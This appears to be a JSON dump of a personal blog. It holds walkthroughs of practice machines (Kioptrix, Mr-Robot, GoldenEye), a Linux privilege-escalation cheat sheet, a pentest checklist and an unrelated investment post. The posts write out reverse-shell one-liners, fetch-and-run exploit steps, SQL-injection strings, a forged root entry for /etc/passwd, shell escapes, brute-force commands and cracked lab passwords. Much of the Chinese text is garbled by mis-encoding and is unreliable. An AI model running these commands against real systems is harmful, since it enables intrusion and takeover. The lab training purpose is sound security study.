{"posts":[{"title":"Kioptrix level 3","content":"Information gathering netdiscover -r 192.168.124.0/24 nmap -Pn -sV -T4 -O -p- 192.168.124.146 nmap --script vuln -p- 192.168.124.146 dirb http://192.168.124.146 /usr/share/wordlists/dirb/big.txt nikto -host 192.168.124.146 Method-1 Get shell We find a login page which buid with lotuscms. Attention,meterpreter is unavailable sometimes.We need to change payload. Privilege escalation The information of this system is as follows. Enclosure ","link":"https://yidwfnyetg.github.io/post/kioptrix-level-3/"},{"title":"Kioptrix level 2","content":"Infromation gathering netdiscover -r 192.168.124.0/24 nmap -Pn -sV -T4 -p- 192.168.124.145 nmap --script vuln 192.168.124.145 dirb http://192.168.124.145 /usr/share/wordlists/dirb/big.txt nikto -host 192.168.124.145 Method-1 Get a shell There is a sql injection vulnerability in log in page. sqlmap -r 1.txt --level 3 --risk 3 --threads 10 --dbms mysql --current-db Or we can use universal password to log in. ' or '1'='1 Next,there is a commond injection. nc -lvnp 9999 [ //]:Run this commond on kali 127.0.0.1&amp;bash -i &gt;&amp; /dev/tcp/192.168.124.4/9999 0&gt;&amp;1 Privilege escalaion searchsploit RHEL 4 Use 9545.c Excute these commonds on kali search -m 9545 python3 -m http.server 9999 Excute these commonds on shell cd /tmp wget http://192.168.124.4:9999/9545.c gcc -o 9545 9545.c chmod a+x 9545 ./9545 Enclusure ","link":"https://yidwfnyetg.github.io/post/kioptrix-level-2/"},{"title":"Kioptrix level 1","content":"Information gathering netdiscover -r 192.168.124.0/24 nmap -Pn -T4 -sV -O 192.168.124.140 -p- nmap --script vuln 192.168.124.140 -p- dirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt Method-1 Samba Attentions please,meterpreter is not availiable It's root.There is no need to escalate privilege. Method-2 OpenFuck mod_ssl vulnerability searchsploit mod_ssl 2.8.4 searchsploit -p 47080 We need install libssl-dev first. gcc -o OpenFuck 47080.c -lcrypto ./OpenFuck ./OpenFuck 0x6b 192.168.124.140 443 -c 40 There are some errors in compile process. Enclosure `Nmap scan report for bogon (192.168.124.140) Host is up (0.0021s latency). Not shown: 65529 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) | vulners: | cpe:/a:openbsd:openssh:2.9p2: | CVE-2002-0640 10.0 https://vulners.com/cve/CVE-2002-0640 | CVE-2002-0639 10.0 https://vulners.com/cve/CVE-2002-0639 | CVE-2002-0083 10.0 https://vulners.com/cve/CVE-2002-0083 | CVE-2011-2895 9.3 https://vulners.com/cve/CVE-2011-2895 | CVE-2006-5051 9.3 https://vulners.com/cve/CVE-2006-5051 | CVE-2006-4924 7.8 https://vulners.com/cve/CVE-2006-4924 | CVE-2003-1562 7.6 https://vulners.com/cve/CVE-2003-1562 | CVE-2010-4478 7.5 https://vulners.com/cve/CVE-2010-4478 | CVE-2002-0575 7.5 https://vulners.com/cve/CVE-2002-0575 | CVE-2001-1459 7.5 https://vulners.com/cve/CVE-2001-1459 | CVE-2001-1380 7.5 https://vulners.com/cve/CVE-2001-1380 | CVE-2001-0816 7.5 https://vulners.com/cve/CVE-2001-0816 | SECURITYVULNS:VULN:1956 7.2 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956 | CVE-2001-0529 7.2 https://vulners.com/cve/CVE-2001-0529 | SSV:64479 5.0 https://vulners.com/seebug/SSV:64479 EXPLOIT | SSV:6192 5.0 https://vulners.com/seebug/SSV:6192 EXPLOIT | SSV:60656 5.0 https://vulners.com/seebug/SSV:60656 EXPLOIT | SSV:16847 5.0 https://vulners.com/seebug/SSV:16847 EXPLOIT | PACKETSTORM:73600 5.0 https://vulners.com/packetstorm/PACKETSTORM:73600 EXPLOIT | PACKETSTORM:54435 5.0 https://vulners.com/packetstorm/PACKETSTORM:54435 EXPLOIT | EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3 5.0 https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3 EXPLOIT | EDB-ID:3303 5.0 https://vulners.com/exploitdb/EDB-ID:3303 EXPLOIT | CVE-2010-5107 5.0 https://vulners.com/cve/CVE-2010-5107 | CVE-2007-2243 5.0 https://vulners.com/cve/CVE-2007-2243 | CVE-2006-5052 5.0 https://vulners.com/cve/CVE-2006-5052 | SSV:66339 4.9 https://vulners.com/seebug/SSV:66339 EXPLOIT | SSV:10777 4.9 https://vulners.com/seebug/SSV:10777 EXPLOIT | EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3 4.9 https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3 EXPLOIT | EDB-ID:8163 4.9 https://vulners.com/exploitdb/EDB-ID:8163 EXPLOIT | CVE-2009-0537 4.9 https://vulners.com/cve/CVE-2009-0537 | CVE-2012-0814 3.5 https://vulners.com/cve/CVE-2012-0814 | CVE-2011-4327 2.1 https://vulners.com/cve/CVE-2011-4327 | CVE-2008-3259 1.2 https://vulners.com/cve/CVE-2008-3259 | SECURITYVULNS:VULN:1953 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953 | SECURITYVULNS:VULN:1608 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608 | SECURITYVULNS:VULN:1499 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499 | SECURITYVULNS:VULN:1488 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488 | SECURITYVULNS:VULN:1474 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474 | SECURITYVULNS:VULN:1439 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439 | SECURITYVULNS:VULN:1344 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344 | SECURITYVULNS:VULN:1262 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262 |_ SECURITYVULNS:VULN:1233 0.0 https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) | http-enum: | /test.php: Test page | /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20' | /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20' |_ /usage/: Potentially interesting folder |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-trace: TRACE is enabled |http-dombased-xss: Couldn't find any DOM based XSS. |http-csrf: Couldn't find any CSRF vulnerabilities. 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 1024/tcp status | 100024 1 1024/udp status 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b | ssl-dh-params: | VULNERABLE: | Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam) | State: VULNERABLE | IDs: BID:74733 CVE:CVE-2015-4000 | The Transport Layer Security (TLS) protocol contains a flaw that is | triggered when handling Diffie-Hellman key exchanges defined with | the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker | to downgrade the security of a TLS session to 512-bit export-grade | cryptography, which is significantly weaker, allowing the attacker | to more easily break the encryption and monitor or tamper with | the encrypted stream. | Disclosure date: 2015-5-19 | Check results: | EXPORT-GRADE DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA | Modulus Type: Safe prime | Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus | Modulus Length: 512 | Generator Length: 8 | Public Key Length: 512 | References: | https://weakdh.org | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000 | https://www.securityfocus.com/bid/74733 | | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA | Modulus Type: Safe prime | Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: | https://weakdh.org |http-dombased-xss: Couldn't find any DOM based XSS. | ssl-ccs-injection: | VULNERABLE: | SSL/TLS MITM vulnerability (CCS Injection) | State: VULNERABLE | Risk factor: High | OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h | does not properly restrict processing of ChangeCipherSpec messages, | which allows man-in-the-middle attackers to trigger use of a zero | length master key in certain OpenSSL-to-OpenSSL communications, and | consequently hijack sessions or obtain sensitive information, via | a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability. | | References: | http://www.openssl.org/news/secadv_20140605.txt | http://www.cvedetails.com/cve/2014-0224 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |http-csrf: Couldn't find any CSRF vulnerabilities. | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: BID:70574 CVE:CVE-2014-3566 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the &quot;POODLE&quot; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_3DES_EDE_CBC_SHA | References: | https://www.openssl.org/~bodo/ssl-poodle.pdf | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.imperialviolet.org/2014/10/14/poodle.html | https://www.securityfocus.com/bid/70574 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug) |_http-aspnet-debug: ERROR: Script execution failed (use -d to debug) |_sslv2-drown: ERROR: Script execution failed (use -d to debug) 1024/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:7C:3A:16 (VMware) Host script results: | smb-vuln-cve2009-3103: | VULNERABLE: | SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) | State: VULNERABLE | IDs: CVE:CVE-2009-3103 | Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, | Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a | denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE | PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, | aka &quot;SMBv2 Negotiation Vulnerability.&quot; | | Disclosure date: 2009-09-08 | References: | http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103 |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14] |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14] Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 356.82 seconds` ","link":"https://yidwfnyetg.github.io/post/kioptrix-level-1/"},{"title":"Mandatory manual","content":"1 Information gathering 1.1 Port scan netdiscover -r 192.168.124.0/24 nmap -Pn -sV -O -T4 --script vuln 192.168.124.44 -p- 1.2 Web scan dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt nikto -port 80 -host 192.168.124.44 -o nikto-result.txt 2 Vulnerability analysis Use nc to view banner. nc -nv 192.168.124.44 22 searchsploit &lt;service name&gt; searchsploit -m 47080 3 Exploitation smb enum4linux 192.168.124.40 smbclient -L 192.168.124.40 4 Privilege escalation 4.1 Linux 4.1.1 Kernel stack overflow uname -a cat /etc/*-release searchsploit linux 3.10 CentOS Linux 7 use tools ./linux-exploit-suggester-2.pl Take the rights of dirty-cow as an example gcc -pthread dirty.c -lcrypt -o dirty chmod +x dirty ./dirty fly 4.1.2 Plain password of root If /etc/passwd can be write by common user. openssl passwd -1 -salt hacker 123456 generate $1$hacker$4o50Z4aoUGaLMC0Rg4Io40 echo 'hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash' &gt;&gt; /etc/passwd Then login in user hacker If /etc/shadow can be read by common user. unshadow /etc/passwd /etc/shadow &gt; shadow.txt chmod 777 shadow.txt john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt 4.1.3 Password reuse 4.1.4 Sudo abuse sudo -l https://gtfobins.github.io/ For example:su, awk, man sudo su sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}' sudo man man !/bin/sh sudo vim -c ':!/bin/sh' 4.1.5 'su root' prohibited python -c 'import pty;pty.spawn(&quot;/bin/sh&quot;) sudo su 4.1.6 Scheduled task ls -l /etc/cron* cat /etc/crontab If there is a scheduled task named 1.py ls -al /tmp/1.py //æŸ¥çœ‹æ˜¯å¦æœ‰wæƒé™ Write the code into 1.py import os os.system('cp /bin/sh /tmp/sh') os.system('chmod u+s /tmp/sh') ./tmp/sh 4.1.7 SUID Take nmap as an example: find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null /usr/local/bin/nmap --interactive !sh whoami 4.1.8 Environment variable hijacking Find command with suid just as 4.1.7. Suppose it is su vim /tmp/su //write shellcode into su export PATH=/tmp:$PATH 4.1.9 Administrator configuration error Configuring a program with SUID that does not have the setuid(0) code, such as find mentioned above. mkdir abc find abc -exec '/bin/sh' \\; 4.1.10 Docker group 4.1.11 Service vulnerability netstat -antup Redis reverse shell. nc -l 12345 | nc 102.168.191.170 80 Windows 5 Domain penetration ","link":"https://yidwfnyetg.github.io/post/mandatory-manual/"},{"title":"Mr-Robot","content":"Information gathering netdiscover -r 192.168.124.0/24 nmap -sV -O -Pn -T4 192.168.124.80 -p- nmap --script vuln 192.168.124.80 -p- dirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt Found login page The wordlist of fsocity.dic The first key Method-1 Exploit wordpress sort and uniq sort fsocity.dic | uniq &gt; fsocity-sort.dic Hydra enumerate users hydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:Invalid username&quot; Wpscan intrude users and password wpscan --url http://192.168.124.4/ --usernames Elliot --passwords fsocity-sort.dic [Valid Combinations Found: Username: Elliot, Password: ER28-0652 Login in wordpress Getshell Visit Appearance-Editor,write shell code into 404.php There are plenty of webshell in /usr/share/webbshells/php/ Use php-reverse-shell.php Remember to change its ip and port listen port 1234 on kali. Then visit any pay which not exists. nc -lvnp 1234 Found another user robot and its file Decode password Write 'c3fcd3d76192e4007dfb496cca67e13b' into hash.txt john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 Turn to user robot python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' su robot Privilege escalation Try to escalate privilege through suid Find all the suid file. find / -user root -perm -4000 -print 2&gt;/dev/null Nmap privilege escalation Only can be used when nmap is version 2.02-5.21 /usr/local/bin/nmap --interactive !sh whoami cat /root/key-3-of-3.txt Enclosure ","link":"https://yidwfnyetg.github.io/post/mr-robot/"},{"title":"Principles of investment","content":"Historical cycle rate Cycleï¼š1 year Base pointï¼šSpring festival Buy pointï¼š(45,135)ï¼Œ(226,315) Sale pointï¼š(136,225)ï¼Œ(316,360) The area of application å¯¹äºè‚¡ç¥¨å¤§è¡Œæƒ…ï¼Œæ¿å—ï¼Œå‘¨æœŸç‡å°¤ä¸ºæ˜æ˜¾ï¼Œè€Œå¯¹äºä¸ªè‚¡ï¼Œä¸ç¡®å®šæ€§å¤ªé«˜ã€‚æ‰€ä»¥æœ€é€‚ç”¨å‘¨æœŸç‡çš„ç†è´¢äº§å“æ˜¯è¡Œä¸šåŸºé‡‘ã€‚ æ¦‚ç‡å’Œå¸‚åœºè§„å¾‹ä¼˜å…ˆï¼Œä¸è¦è¢«å…¶å®ƒè¨€è®ºå’Œå°é“æ¶ˆæ¯å·¦å³ã€‚ åœ¨æ˜¥èŠ‚å‰åŠ¡å¿…å°†ä»“ä½æ¸…ç©ºã€‚ Value investment Two keypoints Buy at a low price Hold for a long time difficulty The most difficult is how to judge the value of stock. State-owned enterprise ç‚’è‚¡ä¹Ÿæœ‰ä¸€äº›å¹´å¤´äº†ï¼Œä¹Ÿäº¤äº†ä¸€äº›å­¦è´¹ï¼Œå›é¡¾è‡ªå·±çš„ç‚’è‚¡å†ç¨‹ï¼Œèµšé’±çš„éƒ½æ˜¯å°èµšï¼Œäºé’±çš„éƒ½æ˜¯å·¨äºã€‚ç»†ç©¶åŸå› ï¼Œå…¶å®å¾ˆç®€å•ï¼Œæ— éä»¥ä¸‹å‡ ç§æƒ…å†µï¼š 1.è‚¡ç¥¨æœ€è¿‘å‡ æ¬¡æ¶¨åœï¼Œæƒ³ç€æ¥ä¸‹æ¥è¿˜ä¼šæ¶¨åœï¼ŒçŸ­çº¿æä¸€æ³¢å°±èµ°ï¼Œä¹°å…¥åæ€¥è½¬ç›´ä¸‹ï¼Œæ…Œäº†ï¼Œä¹°äº†ï¼Œå·¨é¢äºæŸï¼Œäº‹å®ä¸Šåé¢è¿™è‚¡èƒ½æ¶¨å›æ¥ï¼Œåªæ˜¯éœ€å‡ å¹´ã€‚ 2.è‚¡æ ‡é¢‘ç¹æ³¢åŠ¨ï¼ŒåšTèµšç‚¹å°é’±ï¼Œå¼€å§‹ç–¯æ¶¨åï¼Œä¸æ•¢è·Ÿäº†ã€‚ 3.è‚¡ç¥¨å¤„äºä½ä½ï¼Œä¹°å…¥åä»ä¸‹è·Œï¼Œæ¶¨å›åèµ¶ç´§å–å‡ºã€‚ 4.è‚¡ç¥¨å¤„äºä½ä½ï¼Œæ¶¨äº†ä¸€æ³¢åä¸‹è·Œï¼Œå“å¾—èµ¶ç´§è·‘ï¼Œå–äº†ååˆæ¶¨ã€‚ 5.è‚¡ç¥¨å¤„äºä½ä½ï¼Œæ¶¨äº†ä¸€æ³¢åä¸‹è·Œï¼Œæ¶¨å›åå–äº†ï¼Œé”™å¤±å¥½ç‰Œã€‚ æ ¹æœ¬åŸå› ï¼š 1. å¯¹äºè‚¡ç¥¨çš„ä»·å€¼åŠå¯èƒ½çš„é£é™©æ²¡æœ‰æ¸…é†’çš„è®¤è¯†ï¼Œåªæ˜¯æŠ•æœºè€Œå·²ï¼Œç¨æœ‰é£å¹è‰åŠ¨å°±æ€€ç–‘è‡ªå·±äº†ã€‚ 2. æ²¡æœ‰ä¸¥è°¨çš„äº¤æ˜“è§„åˆ™ï¼Œå¤šæ•°å†³å®šéƒ½æ˜¯æ‹è„‘è¢‹ï¼Œä½†æ‹è„‘è¢‹çš„å†³å®šå¤§å¤šæƒ…å†µä¸‹æ˜¯é”™çš„ã€‚ **è§£å†³åŠæ³•** 1.åªç‚’è‡ªå·±çŸ¥é“çš„è¡Œä¸šï¼Œåªä¹°å›½ä¼ 2.ä¹°å…¥è‚¡ç¥¨åï¼ŒæŒ‚æ¡ä»¶å•ï¼Œé¢„ä¼°å¯è¾¾åˆ°çš„æ”¶ç›Šï¼Œè‡³å°‘50%æ”¶ç›Šå–å‡º 3.å›½ä¼ä¸ä¼šå€’é—­ï¼Œåšå†³ä¸å‰²è‚‰ï¼Œå“ªæ€•ä¹°åœ¨åŠå±±è…°ï¼ˆæƒ³æƒ³2020å¹´çš„çŸ³æ²¹ï¼‰ 4.ç¦æ­¢åšTï¼Œé˜²è¸ç©ºã€‚ 5.ç¦æ­¢è¿½æ¶¨ 6.é¢„ä¼°å°‘äº50%æ”¶ç›Šçš„åšå†³ä¸ä¹°ï¼Œå°‘åšä¸é”™ ","link":"https://yidwfnyetg.github.io/post/two-principles-of-investment/"},{"title":"Common process for handling objectives","content":"1ã€NmapåŸºæœ¬æ‰«æ nmap -Pn -p- -vv nmap -Pn -p- -sU -vv 2ã€é’ˆå¯¹ç«¯å£æŒ‡çº¹å’Œæ¼æ´çš„æ‰«æ Nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &lt;ip address&gt; ä½¿ç”¨ncæŸ¥çœ‹banner nc -nv &lt;ip-address&gt; &lt;port&gt; 3ã€é’ˆå¯¹ web ç«¯å£çš„æšä¸¾ Nikto -port {web ports} -host &lt;ip address&gt; -o &lt;output file.txt&gt; ç›®å½•æ‰«æ Dirb http{s}://&lt;ip address&gt;:&lt;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt Gobuster -u http://&lt;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt å¦‚æœæƒ³æµ‹è¯•æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨ fimapï¼š fimap -u &lt;ip-address&gt; 4ã€é’ˆå¯¹å·²çŸ¥çš„æœåŠ¡è¿›è¡Œæ”»å‡»å°è¯•ï¼Œæœç´¢æ¼æ´ä¿¡æ¯ Searchsploit &lt;service name&gt; æ¼æ´æ¥æºï¼š https://www.securityfocus.com/vulnerabilities 5ã€é’ˆå¯¹ web é¡µé¢çš„æµ‹è¯• æ£€æŸ¥é¡µé¢ä¿¡æ¯ï¼Œå®¡æŸ¥å…ƒç´ ã€æŸ¥çœ‹ cookieã€tamper æ•°æ®ã€å¯ä»¥ä½¿ç”¨ curl/wget åœ¨çº¿æœç´¢èµ„æºï¼ˆæ¯”å¦‚ githubï¼‰ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ˜¯å¼€æºçš„ï¼Œæ ¹æ®ç½‘ç«™æšä¸¾çš„ä¿¡æ¯çŒœæµ‹ç‰ˆæœ¬ï¼Œç„¶åæ‰¾å‡ºå¯èƒ½å­˜åœ¨çš„é£é™© æ£€æŸ¥ HTTP é€‰é¡¹ æµ‹è¯•è¾“å…¥è¡¨å•å‚æ•°ï¼ˆæ¯”å¦‚ 1' or 1=1 limit 1; # AND 1' or 1=1--ï¼‰ â— NULL æˆ– null â— ', &quot;, ;, &lt;! â—‹ ä¸­æ–­ SQL å­—ç¬¦ä¸²æˆ–æŸ¥è¯¢ï¼Œå¸¸ç”¨äº SQLã€XPathã€XML æ³¨å…¥ â— -, =, +, &quot; â—‹ ç”¨äºæ‰‹å·¥ SQL æ³¨å…¥æµ‹è¯• â— ', &amp;, ! , Â¦ , &lt; , &gt; â—‹ ç”¨äºæ‰¾å‡ºå‘½ä»¤æ‰§è¡Œæ¼æ´ â— ../ â—‹ ç›®å½•ç©¿è¶Šæ¼æ´ 6ã€é’ˆå¯¹ NETBIOSã€SMBã€RPC ç«¯å£çš„æµ‹è¯• enum4linux -a &lt;ip address&gt; Rpcclient &lt;ip address&gt; -U &quot;&quot; -N Rpcinfo -p &lt;target ip&gt; å…³äº RPC å†å²æ¼æ´çš„åˆé›†ï¼š http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/ ä»¥ä¸‹æ˜¯å¸¸ç”¨çš„è¿œç¨‹æµ‹è¯•å‘½ä»¤ Showmount -e &lt;ip address&gt;/&lt;port&gt; Mount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=â€guestâ€,password=â€â€ Rlogin &lt;ip-address&gt; Smbclient -L &lt;ip-address&gt; -U â€œâ€ -N Nbtscan -r &lt;ip address&gt; Net use &lt;ip-address&gt;$Share â€œâ€ /u:â€â€ Net view &lt;ip-address&gt; è¿˜å¯ä»¥ä½¿ç”¨ NMAP çš„è„šæœ¬æµ‹è¯• SMBã€DCERPCã€NETBIOS 7ã€é’ˆå¯¹ SMTP ç«¯å£çš„å°è¯• æšä¸¾ç”¨æˆ·ï¼Œä½¿ç”¨ VRFY å’Œ EXPN å‘½ä»¤ 8ã€é’ˆå¯¹ SNMP ç«¯å£çš„æµ‹è¯• é»˜è®¤å…±äº«åç§°å¦‚ï¼špublic, private, cisco, manager ä½¿ç”¨å·¥å…·ï¼š Onesixtyone â€“c &lt;community list file&gt; -I &lt;ip-address&gt; Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &lt;ip address&gt; é»˜è®¤ MIBï¼š 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports æ¯”å¦‚æšä¸¾è¿è¡Œçš„è¿›ç¨‹ nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2 9ã€é’ˆå¯¹ FTP ç«¯å£æµ‹è¯• â— anonymous æ˜¯å¦å¯ä»¥ç™»å½• â— å¦‚æœå¯ä»¥ç™»å½•æ˜¯å¦å¯ä»¥ä½¿ç”¨ get æˆ– send æ“ä½œæ–‡ä»¶ â— ä½¿ç”¨æµè§ˆå™¨æ˜¯å¦å¯ä»¥è®¿é—®ï¼Œftp:// 10ã€å¯†ç ç ´è§£ åœ¨ linux ä¸‹å¯ä»¥ä½¿ç”¨ unshadow å‘½ä»¤åˆå¹¶ passwd å’Œ shadow æ–‡ä»¶ï¼š unshadow [passwd-file] [shadow-file] &gt; unshadowed.txt å¯ä»¥ä½¿ç”¨çš„ hash-identifier è¯†åˆ« hash ç±»å‹ï¼Œä½¿ç”¨ hashcat ç ´è§£ hash hashcat -m 400 -a 0 &lt;hash file&gt; &lt;wordlist file&gt; å¯¹äºå…¶ä»–æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ Medusa æˆ– hydra Hydra -L &lt;username file&gt; -P &lt;Password file&gt; -v &lt;ip-address&gt; ssh Medusa -h &lt;ip-address&gt; -U &lt;username file&gt; -P &lt;password file&gt; -M http -m DIR:/admin -T 30 11ã€æ•°æ®åŒ…æŠ“å– ä½¿ç”¨ wireshark / tcpdump è·å–ç›®æ ‡ä¸»æœºçš„æµé‡ â€œtcpdump -i tap0 host tcp port 80 and not arp and not icmp -vvâ€ å‚è€ƒèµ„æ–™ NMAP Cheatsheet https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Exploit-DB https://www.exploit-db.com/ Kernel Exploits https://www.kernel-exploits.com/ Privilege Escalation Linux https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ &lt;Linux Pentest Commands http://www.networkpentest.net/p/linuxunix-command-list.html Windows Command Line Cheatsheet https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf Privilege Escalation Windows: http://www.fuzzysecurity.com/tutorials/16.html http://toshellandback.com/2015/11/24/ms-priv-esc/ Windows Priv Esc cheatsheet http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html Pentest References: http://www.vulnerabilityassessment.co.uk/ http://www.0daysecurity.com/penetration-testing/enumeration.html Reverse Shell: https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ Shell Escape: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells Pentestmonkey Cheat Sheets (SQL Injection) http://pentestmonkey.net/category/cheat-sheet ","link":"https://yidwfnyetg.github.io/post/common-process-for-handling-objectives/"},{"title":"GodenEye","content":"Information gathering netdiscover -r 192.168.124.0/24 nmap -sV -O -Pn -T4 192.168.124.44 -p- nmap --script vuln 192.168.124.44 -p- dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt The nmap scanning result is as enclosure. The dirb found nothing. Method-1 step-1 Intrude the login page(failed) I find its login page,try to intrude it. Authorization is made up of user:password. Find nothing. step-2 View home page source. &amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114; It's unicode,decode it as html,I get 'InvincibleHack3r'.And in source page,i known that the user is boris.Attention please,'boris' not 'Boris'. View source code of this page.In the end i find an explanatory note. step-3 POP3 From nmap result,55007 is pop3 port. Use burpsuite to send packet.It response us slowly,be pacient. Intrude pop3 password.I guess its username is 'natalya' or 'boris'. hydra -s 55007 -L username.txt -P /usr/share/set/src/fasttrack/wordlist.txt -e nsr -t 22 192.168.124.44 pop3 Then I get password.Attention,intrude it successfully only with /usr/share/set/src/fasttrack/wordlist.txt. natalya:bird boris:secret1! step-4 Login mailbox telnet 192.168.124.44 55007 user natalya pass bird list +OK 2 messages: 1 631 2 1048 . retr 1 I find two mails.And the second is critical. step-5 Login in gnocertdir Edit /etc/hosts Visit servernaya-station.com/gnocertdir The username and password has be shown in the second mail. I find a mail of doak.Try to intrude doak's mailbox. Then Get doak:goat Find another account of this system in doak's mailbox. username: dr_doak password: 4England! Sign in system with this account. I find a file named secret.txt. Download picture for-007.jpg Open this picture in notepad++,something intersting show. Decode 'eFdpbnRlcjE5OTV4IQ==',get 'xWinter1995x!' step-6 Moodlecms 